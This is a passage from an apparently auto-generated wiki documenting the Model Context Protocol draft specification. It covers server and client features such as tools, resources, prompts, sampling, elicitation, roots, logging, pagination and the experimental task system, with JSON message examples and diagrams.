*   **Response**: `CallToolResult` ([schema/draft/schema.ts:174-199]()) containing the tool's output, which can include structured or unstructured content. The `isError` field indicates if the tool call resulted in an error.

#### List Changed Notification

If the `listChanged` capability is enabled, the server **SHOULD** send a `notifications/tools/list_changed` notification when the list of available tools changes.

*   **Notification**: `notifications/tools/list_changed` ([schema/draft/schema.ts:1630-1633](), `ToolListChangedNotification`)

### Data Types

*   **Tool**: Defined by `Tool` interface ([schema/draft/schema.ts:1640-1657]()). Includes `name`, `title`, `description`, `inputSchema` (JSON Schema for arguments), `outputSchema` (optional JSON Schema for results), and `icons`.
*   **Tool Result**: Defined by `CallToolResult` interface ([schema/draft/schema.ts:174-199]()). Contains `content` (array of `ContentBlock`s) and optional `structuredContent`.

### Error Handling

Tools use two error reporting mechanisms:

1.  **Protocol Errors**: Standard JSON-RPC errors (e.g., `METHOD_NOT_FOUND` for unknown tools, `INVALID_PARAMS` for malformed requests).
2.  **Tool Execution Errors**: Reported within the `CallToolResult` with `isError: true` and descriptive content. These are intended for language models to self-correct.

Sources:
- schema/draft/schema.ts
- docs/specification/draft/server/tools.mdx

## Resources System

The Resources system allows MCP servers to expose URI-addressable data to clients. This data provides context to language models, such as files, database schemas, or application-specific information.

### User Interaction Model

Resources are designed to be **application-driven**. Host applications determine how to incorporate context based on their needs, such as exposing resources through UI elements or implementing automatic context inclusion.

### Capabilities

Servers supporting resources **MUST** declare the `resources` capability during initialization [docs/specification/draft/server/resources.mdx](). This capability supports two optional features:

*   `subscribe`: Whether the client can subscribe to notifications for changes to individual resources.
*   `listChanged`: Whether the server will send notifications when the list of available resources changes.

```json
{
  "capabilities": {
    "resources": {
      "subscribe": true,
      "listChanged": true
    }
  }
}
```

### Protocol Messages

#### Listing Resources

Clients discover available resources by sending a `resources/list` request. This operation supports [pagination](#2.5.7).

*   **Request**: `resources/list` ([schema/draft/schema.ts:904-907](), `ListResourcesRequest`)
*   **Response**: `ListResourcesResult` ([schema/draft/schema.ts:910-913]()) containing an array of `Resource` objects.

#### Reading Resources

Clients retrieve the contents of a specific resource by sending a `resources/read` request.

*   **Request**: `resources/read` ([schema/draft/schema.ts:999-1002](), `ReadResourceRequest`) with the resource's `uri`.
*   **Response**: `ReadResourceResult` ([schema/draft/schema.ts:1017-1020]()) containing the resource's `contents` (text or binary data).

#### Resource Templates

Servers can expose parameterized resources using URI templates via `resources/templates/list`. Arguments for these templates may be auto-completed through the [Completion](#2.5.6) API. This operation supports [pagination](#2.5.7).

*   **Request**: `resources/templates/list` ([schema/draft/schema.ts:946-949](), `ListResourceTemplatesRequest`)
*   **Response**: `ListResourceTemplatesResult` ([schema/draft/schema.ts:960-963]()) containing an array of `ResourceTemplate` objects.

#### List Changed Notification

If the `listChanged` capability is enabled, the server **SHOULD** send a `notifications/resources/list_changed` notification when the list of available resources changes.

*   **Notification**: `notifications/resources/list_changed` ([schema/draft/schema.ts:1043-1046](), `ResourceListChangedNotification`)

#### Subscriptions

If the `subscribe` capability is enabled, clients can subscribe to individual resource changes.

*   **Subscribe Request**: `resources/subscribe` ([schema/draft/schema.ts:1067-1070](), `SubscribeRequest`) with the resource's `uri`.
*   **Update Notification**: `notifications/resources/updated` ([schema/draft/schema.ts:1118-1121](), `ResourceUpdatedNotification`) sent by the server when a subscribed resource changes.

### Data Types

*   **Resource**: Defined by `Resource` interface ([schema/draft/schema.ts:1140-1154]()). Includes `uri`, `name`, `title`, `description`, `mimeType`, `size`, and `annotations`.
*   **ResourceTemplate**: Defined by `ResourceTemplate` interface ([schema/draft/schema.ts:1160-1174]()). Includes `uriTemplate`, `name`, `title`, `description`, `mimeType`, `inputSchema`, and `annotations`.
*   **Resource Contents**: Can be `TextResourceContents` ([schema/draft/schema.ts:1180-1187]()) or `BlobResourceContents` ([schema/draft/schema.ts:75-99]()).

Sources:
- schema/draft/schema.ts
- docs/specification/draft/server/resources.mdx

## Prompts System

The Prompts system allows MCP servers to expose prompt templates to clients. These templates provide structured messages and instructions for interacting with language models.

### User Interaction Model

Prompts are designed to be **user-controlled**. They are exposed to clients with the intention that users can explicitly select and customize them for use, often through UI elements like slash commands.

### Capabilities

Servers supporting prompts **MUST** declare the `prompts` capability during initialization [docs/specification/draft/server/prompts.mdx](). The `listChanged` sub-capability indicates whether the server will send notifications when the list of available prompts changes.

```json
{
  "capabilities": {
    "prompts": {
      "listChanged": true
    }
  }
}
```

### Protocol Messages

#### Listing Prompts

Clients retrieve available prompts by sending a `prompts/list` request. This operation supports [pagination](#2.5.7).

*   **Request**: `prompts/list` ([schema/draft/schema.ts:1400-1403](), `ListPromptsRequest`)
*   **Response**: `ListPromptsResult` ([schema/draft/schema.ts:1405-1408]()) containing an array of `Prompt` objects.

#### Getting a Prompt

Clients retrieve a specific prompt, potentially with arguments, by sending a `prompts/get` request. Arguments may be auto-completed through the [Completion](#2.5.6) API.

*   **Request**: `prompts/get` ([schema/draft/schema.ts:1420-1423](), `GetPromptRequest`) with the prompt's `name` and optional `arguments`.
*   **Response**: `GetPromptResult` ([schema/draft/schema.ts:1425-1428]()) containing the prompt's `description` and `messages`.

#### List Changed Notification

If the `listChanged` capability is enabled, the server **SHOULD** send a `notifications/prompts/list_changed` notification when the list of available prompts changes.

*   **Notification**: `notifications/prompts/list_changed` ([schema/draft/schema.ts:1448-1451](), `PromptListChangedNotification`)

### Data Types

*   **Prompt**: Defined by `Prompt` interface ([schema/draft/schema.ts:1460-1470]()). Includes `name`, `title`, `description`, `arguments`, and `icons`.
*   **PromptMessage**: Defined by `PromptMessage` interface ([schema/draft/schema.ts:1476-1480]()). Contains `role` and `content` (various content types like text, image, audio, or embedded resources).

Sources:
- schema/draft/schema.ts
- docs/specification/draft/server/prompts.mdx

## Logging

The Logging feature allows MCP servers to send structured log messages to clients. This provides clients with insights into server operations, debugging information, and status updates.

### Capabilities

Servers supporting logging **MUST** declare the `logging` capability during initialization [docs/specification/draft/schema.ts:581-584]().

```json
{
  "capabilities": {
    "logging": {}
  }
}
```

### Protocol Messages

#### Log Notification

Servers send log messages to clients using the `notifications/log` notification.

*   **Notification**: `notifications/log` ([schema/draft/schema.ts:1300-1303](), `LogNotification`) with `level`, `message`, and optional `data`.

#### Setting Log Level

Clients can request the server to set its logging level using the `logging/setLevel` request.

*   **Request**: `logging/setLevel` ([schema/draft/schema.ts:1315-1318](), `SetLevelRequest`) with the desired `level`.
*   **Response**: `EmptyResult` ([schema/draft/schema.ts:330-333]()).

### Data Types

*   **LoggingLevel**: Defined by `LoggingLevel` type ([schema/draft/schema.ts:1280-1290]()). Represents the severity of a log message (e.g., "debug", "info", "error").

Sources:
- schema/draft/schema.ts

## Completion

The Completion feature allows MCP servers to provide argument autocompletion suggestions to clients. This enhances the user experience by guiding them when providing input for tools, prompts, or resource templates.

### Capabilities

Servers supporting completions **MUST** declare the `completions` capability during initialization [schema/draft/schema.ts:589-592]().

```json
{
  "capabilities": {
    "completions": {}
  }
}
```

### Protocol Messages

#### Complete Request

Clients request completion options by sending a `completion/complete` request.

*   **Request**: `completion/complete` ([schema/draft/schema.ts:548-573](), `CompleteRequest`) with the `argument` being completed and a `ref` to the tool, prompt, or resource template.
*   **Response**: `CompleteResult` ([schema/draft/schema.ts:628-661]()) containing an array of `values` (completion suggestions), `total` (total available options), and `hasMore` (if more options exist).

Sources:
- schema/draft/schema.ts

## Tasks

The Tasks system provides a mechanism for handling long-running, asynchronous operations in MCP. This allows clients to initiate an operation and retrieve its result later, without blocking the main communication channel.

### User Interaction Model

Tasks are **requestor-driven**. The party initiating the task (client or server) is responsible for augmenting requests with tasks and polling for their results. Receivers control which requests support task-based execution and manage task lifecycles.

### Capabilities

Servers supporting tasks **MUST** declare the `tasks` capability during initialization [docs/specification/draft/basic/utilities/tasks.mdx](). This capability specifies which server-side requests can be augmented with tasks and whether `tasks/list` and `tasks/cancel` operations are supported.

```json
{
  "capabilities": {
    "tasks": {
      "list": {},
      "cancel": {},
      "requests": {
        "tools": {
          "call": {}
        }
      }
    }
  }
}
```

### Protocol Messages

#### Creating Tasks

To create a task, a requestor sends a request with the `task` field included in the request parameters. The server immediately responds with a `CreateTaskResult`.

*   **Request**: Any request with `task` field in its parameters (e.g., `tools/call` with `TaskAugmentedRequestParams` [schema/draft/schema.ts:71-81]()).
*   **Response**: `CreateTaskResult` ([schema/draft/schema.ts:2000-2003]()) containing `taskId`, `status`, `createdAt`, `lastUpdatedAt`, `ttl`, and `pollInterval`.

#### Getting Tasks

Requestors poll for task completion by sending `tasks/get` requests.

*   **Request**: `tasks/get` ([schema/draft/schema.ts:2015-2018](), `GetTaskRequest`) with the `taskId`.
*   **Response**: `GetTaskResult` ([schema/draft/schema.ts:2020-2023]()) containing the current `Task` state.

#### Retrieving Task Results

After a task completes, its operation result is retrieved via `tasks/result`.

*   **Request**: `tasks/result` ([schema/draft/schema.ts:2035-2038](), `GetTaskPayloadRequest`) with the `taskId`.
*   **Response**: `GetTaskPayloadResult` ([schema/draft/schema.ts:2040-2043]()) containing the actual result of the original operation.

#### Task Status Notification

Receivers **MAY** send `notifications/tasks/status` notifications when a task's status changes.

*   **Notification**: `notifications/tasks/status` ([schema/draft/schema.ts:2055-2058](), `TaskStatusNotification`) with the full `Task` object.

#### Listing Tasks

Requestors can retrieve a list of tasks by sending a `tasks/list` request. This operation supports [pagination](#2.5.7).

*   **Request**: `tasks/list` ([schema/draft/schema.ts:2070-2073](), `ListTasksRequest`)
*   **Response**: `ListTasksResult` ([schema/draft/schema.ts:2075-2078]()) containing an array of `Task` objects.

#### Cancelling Tasks

Requestors can explicitly cancel a task by sending a `tasks/cancel` request.

*   **Request**: `tasks/cancel` ([schema/draft/schema.ts:232-247](), `CancelTaskRequest`) with the `taskId`.
*   **Response**: `CancelTaskResult` ([schema/draft/schema.ts:258-267]()) containing the updated `Task` state (status `cancelled`).

### Data Types

*   **Task**: Defined by `Task` interface ([schema/draft/schema.ts:1960-1970]()). Includes `taskId`, `status`, `statusMessage`, `createdAt`, `lastUpdatedAt`, `ttl`, and `pollInterval`.
*   **TaskStatus**: Defined by `TaskStatus` type ([schema/draft/schema.ts:1976-1982]()). Represents the current state of a task (e.g., "working", "completed", "failed", "cancelled", "input\_required").

### Task Status State Diagram

The lifecycle of a task is governed by specific state transitions:

```mermaid
stateDiagram-v2
    [*] --> working

    working --> input_required
    working --> terminal

    input_required --> working
    input_required --> terminal

    terminal --> [*]

    note right of terminal
        Terminal states:
        "completed"
        "failed"
        "cancelled"
    end note
```

Sources:
- schema/draft/schema.ts
- docs/specification/draft/basic/utilities/tasks.mdx

## Pagination

Several server features, such as listing tools, resources, and prompts, support pagination to handle large result sets efficiently.

### Common Parameters

Paginated requests include an optional `cursor` parameter.

*   **Request Parameter**: `cursor` ([schema/draft/schema.ts:883-886](), `Cursor`)
    *   An opaque token representing the current pagination position. If provided, the server returns results starting after this cursor.

### Common Results

Paginated responses include an optional `nextCursor` field.

*   **Result Field**: `nextCursor` ([schema/draft/schema.ts:899-902](), `Cursor`)
    *   An opaque token representing the pagination position after the last returned result. If present, there may be more results available.

### Behavior Requirements

*   Servers **SHOULD** use cursor-based pagination to limit the number of items returned.
*   Servers **MUST** include a `nextCursor` in the response if more items are available.
*   Requestors **MUST** treat cursors as opaque tokens and not attempt to parse or modify them.

Sources:
- schema/draft/schema.ts

---

# Page: Client Features

# Client Features

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [.github/CODEOWNERS](.github/CODEOWNERS)
- [docs/clients.mdx](docs/clients.mdx)
- [docs/docs/tutorials/security/authorization.mdx](docs/docs/tutorials/security/authorization.mdx)
- [docs/sdk/java/mcp-client.mdx](docs/sdk/java/mcp-client.mdx)
- [docs/sdk/java/mcp-overview.mdx](docs/sdk/java/mcp-overview.mdx)
- [docs/sdk/java/mcp-server.mdx](docs/sdk/java/mcp-server.mdx)
- [docs/specification/draft/basic/utilities/tasks.mdx](docs/specification/draft/basic/utilities/tasks.mdx)
- [docs/specification/draft/client/elicitation.mdx](docs/specification/draft/client/elicitation.mdx)
- [docs/specification/draft/client/sampling.mdx](docs/specification/draft/client/sampling.mdx)
- [docs/specification/draft/schema.mdx](docs/specification/draft/schema.mdx)
- [schema/draft/schema.json](schema/draft/schema.json)
- [schema/draft/schema.ts](schema/draft/schema.ts)

</details>



## Purpose and Scope

This document covers the capabilities that MCP **clients** expose to **servers**, enabling servers to request operations that require client resources or user interaction. These features are distinct from server features ([2.5](#2.5)), which servers expose to clients.

Client features include:
- **Sampling**: LLM completions/generations requested by servers
- **Elicitation**: User input collection through forms or external URLs
- **Roots**: Filesystem boundary declarations for context scoping
- **Logging**: Server log message routing to client handlers

All client features follow a capability-based security model where clients explicitly declare support during initialization and maintain control over execution with human-in-the-loop approval workflows.

Sources: [docs/specification/draft/client/sampling.mdx:1-37](), [docs/specification/draft/client/elicitation.mdx:1-42](), [schema/draft/schema.ts:302-377]()

## Client Capability Declaration

Clients declare which features they support in the `ClientCapabilities` interface during the initialization handshake. The server receives this declaration in the `initialize` request and adjusts its behavior accordingly.

### ClientCapabilities Structure

```mermaid
graph TB
    ClientCaps["ClientCapabilities"]
    
    Sampling["sampling<br/>{context?, tools?}"]
    Elicitation["elicitation<br/>{form?, url?}"]
    Roots["roots<br/>{listChanged?}"]
    Tasks["tasks<br/>{list?, cancel?, requests?}"]
    Experimental["experimental<br/>{[key: string]: object}"]
    
    ClientCaps --> Sampling
    ClientCaps --> Elicitation
    ClientCaps --> Roots
    ClientCaps --> Tasks
    ClientCaps --> Experimental
    
    SamplingContext["context: {}<br/>Supports includeContext parameter"]
    SamplingTools["tools: {}<br/>Supports tool use in sampling"]
    
    Sampling --> SamplingContext
    Sampling --> SamplingTools
    
    ElicitForm["form: {}<br/>Supports form-based elicitation"]
    ElicitURL["url: {}<br/>Supports URL-based elicitation"]
    
    Elicitation --> ElicitForm
    Elicitation --> ElicitURL
    
    RootsChanged["listChanged: boolean<br/>Supports roots change notifications"]
    
    Roots --> RootsChanged
```

Sources: [schema/draft/schema.ts:302-377](), [schema/draft/schema.json:302-407]()

### Example Capability Declaration

**Client declaring sampling with tool support:**
```json
{
  "capabilities": {
    "sampling": {
      "tools": {}
    },
    "elicitation": {
      "form": {},
      "url": {}
    },
    "roots": {
      "listChanged": true
    }
  }
}
```

Servers **MUST NOT** send requests for features that clients have not declared support for. For example, a server cannot send `sampling/createMessage` requests with `tools` unless the client declares `sampling.tools` capability.

Sources: [docs/specification/draft/client/sampling.mdx:46-82](), [docs/specification/draft/client/elicitation.mdx:44-73]()

## Sampling

Sampling enables servers to request LLM completions from the client's language model. This allows servers to implement agentic behaviors where LLM calls occur nested inside other MCP operations, while clients maintain full control over model selection, access, and user approval.

### Protocol Flow

```mermaid
sequenceDiagram
    participant Server
    participant Client
    participant User
    participant LLM

    Note over Server,Client: Sampling Request
    Server->>Client: CreateMessageRequest<br/>(sampling/createMessage)
    
    Note over Client,User: Human-in-the-loop
    Client->>User: Present prompt for review
    User-->>Client: Approve/modify
    
    Client->>LLM: Forward to model
    LLM-->>Client: Generate response
    
    Client->>User: Present response for review
    User-->>Client: Approve
    
    Client-->>Server: CreateMessageResult
```

Sources: [docs/specification/draft/client/sampling.mdx:1-145]()

### CreateMessageRequest Structure

The `CreateMessageRequest` message type defines the sampling request protocol.

**Key fields:**
- `method`: `"sampling/createMessage"`
- `params.messages`: Array of `SamplingMessage` objects containing conversation history
- `params.modelPreferences`: Optional hints for model selection
- `params.systemPrompt`: Optional system prompt
- `params.maxTokens`: Token limit
- `params.tools`: Optional array of tool definitions for agentic sampling
- `params.toolChoice`: Optional tool selection strategy
- `params.includeContext`: Context inclusion mode (`"none"`, `"thisServer"`, `"allServers"`)

Sources: [schema/draft/schema.ts:657-731](), [docs/specification/draft/client/sampling.mdx:93-145]()

### Tools in Sampling

Servers can request that the client's LLM use tools during sampling, enabling multi-turn agentic workflows where the LLM calls tools, receives results, and continues generation.

**Tool-enabled sampling flow:**

```mermaid
sequenceDiagram
    participant Server
    participant Client
    participant LLM

    Server->>Client: CreateMessageRequest<br/>(with tools array)
    Client->>LLM: Forward with tool definitions
    LLM-->>Client: Response with tool_use<br/>(stopReason: "toolUse")
    Client-->>Server: Return tool_use content
    
    Note over Server: Execute tools
    Server->>Server: Run tool(s)
    
    Server->>Client: CreateMessageRequest<br/>(history + tool_results)
    Client->>LLM: Forward with results
    LLM-->>Client: Final response<br/>(stopReason: "endTurn")
    Client-->>Server: Return final message
```

**Tool definition structure:**
```typescript
{
  "name": "tool_name",
  "description": "Tool description",
  "inputSchema": { /* JSON Schema */ }
}
```

Clients **MUST** declare `sampling.tools` capability to receive tool-enabled requests.

Sources: [docs/specification/draft/client/sampling.mdx:38-264](), [schema/draft/schema.ts:1186-1222]()

### Security and Approval

For trust and safety, there **SHOULD** always be a human in the loop with the ability to deny sampling requests. Implementations **SHOULD**:

- Provide UI for reviewing sampling requests before execution
- Allow users to view and edit prompts
- Present generated responses for review before delivery to server
- Clearly indicate which server is requesting the sampling

Sources: [docs/specification/draft/client/sampling.mdx:16-36]()

## Elicitation

Elicitation enables servers to request additional information from users through the client. It supports two distinct modes with different security characteristics:

- **Form mode**: Structured data collection with optional JSON Schema validation (data visible to client)
- **URL mode**: Out-of-band interactions via external URLs (data **not** visible to client)

### Elicitation Mode Comparison

| Aspect | Form Mode | URL Mode |
|--------|-----------|----------|
| **Data visibility** | Client sees and handles data | Client only sees URL, not data |
| **Use case** | Non-sensitive structured data | Credentials, OAuth, payments |
| **Schema validation** | JSON Schema support | N/A |
| **User experience** | In-client form UI | External browser navigation |
| **Completion notification** | Immediate in response | Optional async notification |

Sources: [docs/specification/draft/client/elicitation.mdx:1-42]()

### Form Mode Elicitation

Form mode allows servers to collect structured data directly through the MCP client with optional JSON Schema validation.

**ElicitRequest structure for form mode:**

```mermaid
graph LR
    ElicitReq["ElicitRequest"]
    Params["params"]
    
    ElicitReq --> Params
    
    Mode["mode: 'form'<br/>(or omit for backward compat)"]
    Message["message: string<br/>(explanation for user)"]
    Schema["requestedSchema: object<br/>(JSON Schema definition)"]
    
    Params --> Mode
    Params --> Message
    Params --> Schema
    
    Properties["properties<br/>(flat object structure)"]
    Required["required: string[]"]
    
    Schema --> Properties
    Schema --> Required
    
    StringProp["string: {type, description,<br/>minLength, pattern, format}"]
    NumberProp["number/integer: {type,<br/>minimum, maximum}"]
    BoolProp["boolean: {type}"]
    EnumProp["enum: {enum or oneOf}"]
    
    Properties --> StringProp
    Properties --> NumberProp
    Properties --> BoolProp
    Properties --> EnumProp
```

**Form schema restrictions:**
- Flat object structure only (no nested objects)
- Primitive types only: string, number, integer, boolean
- Enum support via `enum` or `oneOf` with `const`
- Supported formats: `email`, `uri`, `date`, `date-time`

**Security requirement:** Servers **MUST NOT** use form mode to request sensitive information such as credentials. Use URL mode instead.

Sources: [docs/specification/draft/client/elicitation.mdx:74-323](), [schema/draft/schema.ts:1746-1839]()

### URL Mode Elicitation

URL mode directs users to external URLs for out-of-band interactions that must not pass through the MCP client. This is essential for auth flows, payment processing, and other sensitive operations.

**ElicitRequest structure for URL mode:**

```typescript
{
  "method": "elicitation/create",
  "params": {
    "mode": "url",
    "elicitationId": "unique-identifier",
    "url": "https://server.example.com/auth",
    "message": "Please authenticate to continue."
  }
}
```

**URL mode flow:**

```mermaid
sequenceDiagram
    participant Server
    participant Client
    participant User
    participant ExternalURL["External URL<br/>(server-controlled)"]

    Server->>Client: ElicitRequest (URL mode)<br/>with elicitationId
    
    Client->>User: Display URL and message<br/>Request navigation consent
    User-->>Client: Approve navigation
    
    Client-->>Server: ElicitResult<br/>(action: "accept")
    
    Note over User,ExternalURL: Out-of-band interaction
    User->>ExternalURL: Navigate to URL
    ExternalURL->>User: Handle auth/payment/etc
    User-->>ExternalURL: Complete interaction
    
    Note over Server: Optional notification
    Server--)Client: ElicitationCompleteNotification
```

**Key characteristics:**
- `elicitationId` uniquely identifies the elicitation session
- Response with `action: "accept"` means user consented to navigation, **not** that interaction completed
- Actual interaction occurs out-of-band
- Server **MAY** send `notifications/elicitation/complete` when interaction finishes
- Clients **MUST** clearly display target domain and gather consent before navigation

Sources: [docs/specification/draft/client/elicitation.mdx:325-513](), [schema/draft/schema.ts:1794-1863]()

### Elicitation Error Handling

When a request cannot be processed until an elicitation completes, servers return a `URLElicitationRequiredError` (error code `-32042`).

**Error structure:**
```json
{
  "code": -32042,
  "message": "URL elicitation required",
  "data": {
    "elicitations": [
      {
        "mode": "url",
        "elicitationId": "...",
        "url": "...",
        "message": "..."
      }
    ]
  }
}
```

Clients **SHOULD** automatically handle this error by presenting the elicitation request(s) to the user.

Sources: [docs/specification/draft/client/elicitation.mdx:419-513](), [schema/draft/schema.ts:182-197]()

## Roots

Roots represent filesystem boundaries that clients can expose to servers, helping scope context and define access boundaries. This feature enables servers to understand which filesystem paths are relevant to the current session.

### Protocol Messages

**ListRootsRequest:**
```typescript
{
  "method": "roots/list"
}
```

**ListRootsResult:**
```typescript
{
  "roots": [
    {
      "uri": "file:///Users/alice/project",
      "name": "My Project"
    }
  ]
}
```

**Root structure:**
- `uri`: Filesystem URI identifying the root location
- `name`: Optional human-readable name for display

Sources: [schema/draft/schema.ts:1873-1905]()

### Root Change Notifications

Clients declaring `roots.listChanged: true` capability can send `RootsListChangedNotification` when the roots list changes.

**RootsListChangedNotification:**
```typescript
{
  "method": "notifications/roots/list_changed",
  "params": {}
}
```

Servers **SHOULD** call `roots/list` again after receiving this notification to get the updated list.

Sources: [schema/draft/schema.ts:1907-1918]()

### Use Cases

Roots are commonly used to:
- Define workspace boundaries in IDE integrations
- Scope resource searches to relevant directories
- Establish trust boundaries for file access
- Provide context about project structure

From the client ecosystem data, roots are supported by:
- VS Code GitHub Copilot (full support)
- Claude Code (full support)
- Cursor, ECA, and others (partial support)

Sources: [docs/clients.mdx:14-111]()

## Logging

Logging enables servers to send log messages to clients for display, debugging, or persistence. Clients control the log level threshold and routing of messages.

### Protocol Messages

**SetLevelRequest** (Client → Server):

Clients send this request to configure the minimum log level they wish to receive.

```typescript
{
  "method": "logging/setLevel",
  "params": {
    "level": "info"  // or "debug", "notice", "warning", "error", etc.
  }
}
```

**LoggingMessageNotification** (Server → Client):

Servers send log messages as notifications.

```typescript
{
  "method": "notifications/message",
  "params": {
    "level": "info",
    "logger": "my-server",
    "data": { /* arbitrary log data */ }
  }
}
```

Sources: [schema/draft/schema.ts:2097-2145]()

### Log Levels

MCP uses syslog severity levels (RFC-5424):

| Level | Numeric Value | Description |
|-------|---------------|-------------|
| `debug` | 7 | Detailed debugging information |
| `info` | 6 | Informational messages |
| `notice` | 5 | Normal but significant conditions |
| `warning` | 4 | Warning conditions |
| `error` | 3 | Error conditions |
| `critical` | 2 | Critical conditions |
| `alert` | 1 | Action must be taken immediately |
| `emergency` | 0 | System is unusable |

Servers **MUST** respect the client's configured log level and only send messages at or above that threshold.

Sources: [schema/draft/schema.ts:2050-2077](), [docs/specification/draft/schema.mdx:61-63]()

### Capability Declaration

Servers declare logging support in `ServerCapabilities`:

```json
{
  "capabilities": {
    "logging": {}
  }
}
```

Sources: [schema/draft/schema.ts:384-455]()

## Security Model and Approval Workflows

All client features follow a defense-in-depth security model with multiple layers of protection.

### Human-in-the-Loop Requirements

**For sampling:**
- There **SHOULD** always be a human in the loop with ability to deny requests
- Users **SHOULD** review and potentially edit prompts before sending
- Users **SHOULD** review generated responses before delivery to server

**For elicitation:**
- Form mode: Users **MUST** review and can modify responses before sending
- URL mode: Users **MUST** consent to navigation and understand target domain
- Clients **MUST** provide clear decline and cancel options

Sources: [docs/specification/draft/client/sampling.mdx:25-36](), [docs/specification/draft/client/elicitation.mdx:30-42]()

### Trust Boundaries

```mermaid
graph TB
    subgraph UserSpace["User Trust Domain"]
        User["User"]
        Client["MCP Client"]
    end
    
    subgraph ServerSpace["Server Trust Domain"]
        Server["MCP Server"]
    end
    
    subgraph ExternalSpace["External Trust Domain"]
        LLM["LLM Provider"]
        ExtURL["External URLs"]
    end
    
    User -->|"approves requests"| Client
    Client <-->|"sampling requests<br/>elicitation requests<br/>roots declarations<br/>log messages"| Server
    Client -->|"forwards approved<br/>sampling requests"| LLM
    User -->|"navigates for<br/>URL elicitation"| ExtURL
    
    Server -.->|"MUST NOT bypass<br/>client for sensitive ops"| ExtURL
    Server -.->|"MUST NOT bypass<br/>client for LLM access"| LLM
    
    style UserSpace fill:#f9f9f9
    style ServerSpace fill:#f9f9f9
    style ExternalSpace fill:#f9f9f9
```

**Key security principles:**

1. **Client mediation**: All sensitive operations flow through the client, not directly between server and external services
2. **Explicit capability declaration**: Servers cannot use features clients haven't declared support for
3. **User consent**: All operations requiring external interaction require explicit user approval
4. **Data minimization**: URL mode elicitation prevents clients from seeing sensitive data
5. **Clear attribution**: Users always know which server is requesting operations

Sources: [docs/specification/draft/client/sampling.mdx:16-36](), [docs/specification/draft/client/elicitation.mdx:28-42]()

### Sensitive Information Handling

**Servers MUST:**
- Use URL mode elicitation (not form mode) for credentials, API keys, and other secrets
- Never request sensitive information through sampling prompts
- Not assume approval means completion for URL mode elicitation

**Clients MUST:**
- Clearly indicate which server is making requests
- Display target domain/host for URL mode elicitation before navigation
- Provide UI for reviewing sampling requests and elicitation forms
- Not send form responses or sampling results without user approval

Sources: [docs/specification/draft/client/elicitation.mdx:30-42]()

## Client Feature Adoption

Based on the client ecosystem data, feature adoption varies significantly:

| Feature | Adoption Rate | Notable Implementations |
|---------|---------------|------------------------|
| **Sampling** | ~15% | AIQL TUUI, fast-agent, Postman, VS Code Copilot |
| **Elicitation** | ~10% | fast-agent, mcp-use, Postman, Tambo, VS Code Copilot |
| **Roots** | ~8% | Claude Code, Cursor, ECA, fast-agent, VS Code Copilot |
| **Instructions** | ~5% | Claude Code, fast-agent, Gemini CLI, VS Code Copilot |

Most MCP clients focus primarily on consuming server features (especially Tools at ~95% adoption) rather than exposing client features to servers. Full-featured clients like VS Code GitHub Copilot and fast-agent support all eight protocol features (8/8), while the majority of clients implement only core server feature consumption.

Sources: [docs/clients.mdx:8-111]()

---

# Page: Task System and Async Operations

# Task System and Async Operations

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [.github/CODEOWNERS](.github/CODEOWNERS)
- [blog/content/posts/2025-11-25-first-mcp-anniversary.md](blog/content/posts/2025-11-25-first-mcp-anniversary.md)
- [blog/layouts/partials/footer.html](blog/layouts/partials/footer.html)
- [blog/static/posts/images/first-mcp-anniversary/david-mcp-may.webp](blog/static/posts/images/first-mcp-anniversary/david-mcp-may.webp)
- [blog/static/posts/images/first-mcp-anniversary/kent-jarvis-mcp.webp](blog/static/posts/images/first-mcp-anniversary/kent-jarvis-mcp.webp)
- [blog/static/posts/images/first-mcp-anniversary/maintainers-meetup.webp](blog/static/posts/images/first-mcp-anniversary/maintainers-meetup.webp)
- [blog/static/posts/images/first-mcp-anniversary/maintainers-write.webp](blog/static/posts/images/first-mcp-anniversary/maintainers-write.webp)
- [blog/static/posts/images/first-mcp-anniversary/mcp-night-github-mcp.webp](blog/static/posts/images/first-mcp-anniversary/mcp-night-github-mcp.webp)
- [blog/static/posts/images/first-mcp-anniversary/mcp-night.webp](blog/static/posts/images/first-mcp-anniversary/mcp-night.webp)
- [blog/static/posts/images/first-mcp-anniversary/mcp.webp](blog/static/posts/images/first-mcp-anniversary/mcp.webp)
- [docs/specification/draft/basic/utilities/tasks.mdx](docs/specification/draft/basic/utilities/tasks.mdx)
- [docs/specification/draft/client/elicitation.mdx](docs/specification/draft/client/elicitation.mdx)
- [docs/specification/draft/client/sampling.mdx](docs/specification/draft/client/sampling.mdx)
- [docs/specification/draft/schema.mdx](docs/specification/draft/schema.mdx)
- [schema/draft/schema.json](schema/draft/schema.json)
- [schema/draft/schema.ts](schema/draft/schema.ts)

</details>



This page documents the MCP task system, which enables asynchronous, long-running operations through a polling-based workflow model. Tasks were introduced in version 2025-11-25 via SEP-1686 and are currently **experimental**.

For information about synchronous request/response patterns, see the base protocol documentation ([2.2](#2.2)). For server features that can be augmented with tasks (tools, etc.), see [2.5](#2.5). For client features that can be augmented with tasks (sampling, elicitation), see [2.6](#2.6).

## Overview

The task system provides a standardized mechanism for representing expensive computations, batch processing, and operations that require user interaction mid-execution. When a request is augmented with a task, the receiver immediately returns a `CreateTaskResult` containing task metadata, rather than blocking until the operation completes. The requestor can then poll for status updates and retrieve results when ready.

Tasks integrate seamlessly with existing MCP features including `tools/call`, `sampling/createMessage`, and `elicitation/create`, allowing servers and clients to implement agentic behaviors with long-running operations.

**Sources:** [docs/specification/draft/basic/utilities/tasks.mdx:1-19](), [blog/content/posts/2025-11-25-first-mcp-anniversary.md:134-158]()

## Architecture

### Requestor-Receiver Model

```mermaid
graph TB
    subgraph "Task Augmented Request Flow"
        Requestor["Requestor<br/>(Client or Server)"]
        Receiver["Receiver<br/>(Server or Client)"]
        
        Requestor -->|"Request with task field"| Receiver
        Receiver -->|"CreateTaskResult (immediate)"| Requestor
        
        Requestor -->|"tasks/get (polling)"| Receiver
        Receiver -->|"Task status"| Requestor
        
        Requestor -->|"tasks/result (blocking)"| Receiver
        Receiver -->|"Operation result"| Requestor
        
        Requestor -->|"tasks/cancel"| Receiver
        Receiver -->|"CancelTaskResult"| Requestor
    end
    
    subgraph "Task States"
        working["working"]
        input_required["input_required"]
        terminal["Terminal:<br/>completed/failed/cancelled"]
        
        working -->|"Need user input"| input_required
        working -->|"Done"| terminal
        input_required -->|"Input received"| working
        input_required -->|"Done"| terminal
    end
```

Tasks use directional terminology where the **requestor** sends a task-augmented request and the **receiver** executes it. Either party can be requestor or receiver:
- **Client as requestor**: Augments `tools/call` requests to servers
